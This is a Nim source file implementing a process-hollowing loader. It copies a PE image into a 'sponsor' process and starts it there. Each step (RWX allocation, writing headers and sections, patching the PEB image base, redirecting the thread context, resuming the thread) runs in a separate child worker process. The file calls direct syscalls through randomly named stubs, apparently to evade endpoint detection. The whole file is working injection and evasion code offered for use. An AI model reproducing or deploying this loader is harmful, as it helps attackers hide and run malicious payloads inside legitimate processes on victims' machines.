import os
import winim
import strutils
import ptr_math

include syscalls

# Manager           -> -M
# Allocate          -> -A:<sponsor-process-handle>
# Write             -> -W:<sponsor-process-handle>
# Thread context    -> -T:<sponsor-thread-handle>
# Resume            -> -R:<sponsor-thread-handle>


proc allocateMemoryProcess(
    processHandle: Handle, 
    peImageImageBase: ptr PVOID, 
    peImageSize: ptr size_t
) =
    if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
        processHandle,
        peImageImageBase,
        0,
        peImageSize,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    ) != 0:
        quit(1)
    else:
        quit(0)


proc writeMemoryProcess(
    processHandle: Handle,
    peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
    peImageImageBase: PVOID, 
    peBytesPtr: ptr byte, 
    peImageSizeOfHeaders: size_t, 
    peImageSectionsHeader: ptr IMAGE_SECTION_HEADER   
) =

    # Get remote PEB address
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    
    if NtQueryInformationProcess(
        processHandle,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        quit(1)

    let sponsorPeb = bi.PebBaseAddress

    # Copy PE headers to sponsor process
    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
        processHandle,
        peImageImageBase,
        peBytesPtr,
        peImageSizeOfHeaders,
        NULL
    ) != 0: 
        quit(1)
    

    # Copy PE sections to sponsor process  
    for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
            processHandle,
            peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
            peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
            peImageSectionsHeader[i].SizeOfRawData,
            NULL
        ) != 0:
            quit(1)
    
    # Overwrite sponsor PEB with the new image base address 
    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
        processHandle,
        cast[LPVOID](cast[int](sponsorPeb) + 0x10),
        unsafeAddr peImageImageBase,
        8,
        NULL
    ) != 0:
        quit(1)

    # success
    quit(0)


proc setThreadProcess(
    threadHandle: Handle,
    peImageImageBase: PVOID,
    peImageEntryPoint: PVOID
) =
    var context: CONTEXT
    context.ContextFlags = CONTEXT_INTEGER
    if VzpSdkMDEGHOzTpB( # NtGetContextThread
        threadHandle, 
        addr context
    ) != 0:
        quit(1)
    var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
    context.Rcx = cast[DWORD64](entryPoint)
    if IGyhziwCULdezDSq( # NtSetContextThread
        threadHandle, 
        addr context
    ) != 0:
        quit(1)


proc resumeThreadProcess(
    threadHandle: Handle
) =
    if mAcJDfMgbUNFgsxu( # NtResumeThread
        threadHandle,
        NULL
    ) != 0:
        quit(1)
    # success
    quit(0)


proc createProcessWorker(arg: string): PPROCESS_INFORMATION =

    var processCmd = getAppFilename() & " " & arg
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    if CreateProcessA(
        NULL,
        cast[LPSTR](addr processCmd[0]),
        NULL,
        NULL, 
        TRUE,
        0, # CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si,
        addr pi
    ) != TRUE:
        echo $GetLastError()
        quit()

    return addr pi


proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase: PVOID): bool =
    
    # Vars to check childen processes
    var res: DWORD
    var ppi: PPROCESS_INFORMATION

    # Allocate memory in sponsor process
    when not defined(release): echo "[*] Allocating memory in sponsor process"     
    ppi = createProcessWorker("-A:" & $sponsorProcessHandle)
    WaitForSingleObject(ppi.hProcess, 3 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
        quit(1)

    when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 

    # Copy PE to sponsor process 
    when not defined(release): echo "[*] Copying PE to sponsor process"
    ppi = createProcessWorker("-W:" & $sponsorProcessHandle)
    WaitForSingleObject(ppi.hProcess, 3 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not write to sponsor process"
        quit(1)

    # Change sponsor thread Entrypoint
    when not defined(release): echo "[*] Changing thread context"
    ppi = createProcessWorker("-T:" & $sponsorThreadHandle)
    WaitForSingleObject(ppi.hProcess, 3 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not change thread context"
        quit(1)

    # Resume remote thread 
    when not defined(release): echo "[*] Resuming thread"
    ppi = createProcessWorker("-R:" & $sponsorThreadHandle)
    WaitForSingleObject(ppi.hProcess, 3 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not resume thread"
        quit(1)


proc splittedNimlineHollowManager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
    
    # Extract process information
    let sponsorProcessHandle = sponsorProcessInfo.hProcess
    let sponsorThreadHandle = sponsorProcessInfo.hThread
    let sponsorPid = sponsorProcessInfo.dwProcessId
    let sponsorTid = sponsorProcessInfo.dwThreadId
    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
    
    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    
    discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)

 
proc splittedNimlineHollowWorker*(peStr: string): bool =
  
    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
    var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
    var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
    
    # Extract process parameters
    let commandLineParams = commandLineParams()

    # Parse command line args
    for i in commandLineParams:
        if i.startsWith("-A:"):
            allocateMemoryProcess(
                parseInt(i.replace("-A:", "")), 
                addr peImageImageBase, 
                addr peImageSize
            )
        elif i.startsWith("-W:"):
            writeMemoryProcess(
                parseInt(i.replace("-W:", "")), 
                peImageNtHeaders, 
                peImageImageBase, 
                peBytesPtr, 
                peImageSizeOfHeaders, 
                peImageSectionsHeader 
            )
        elif i.startsWith("-T:"):
            setThreadProcess(
                parseInt(i.replace("-T:", "")),
                peImageImageBase,
                peImageEntryPoint
            )
        elif i.startsWith("-R:"):
            resumeThreadProcess(
                parseInt(i.replace("-R:", ""))
            )
        else:
            quit(1)
